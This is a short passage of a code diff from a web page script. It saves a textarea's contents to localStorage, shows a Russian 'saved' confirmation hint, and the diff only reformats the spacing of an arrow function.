     e.preventDefault();
     localStorage.setItem(KEY, area.value);
     hint.textContent = '✓ сохранено';
     hint.classList.add('show');
-    setTimeout(() => hint.classList.remove('show'), 1200);
+    setTimeout(()=>hint.classList.remove('show'), 1200);
   }
 });
 </script>
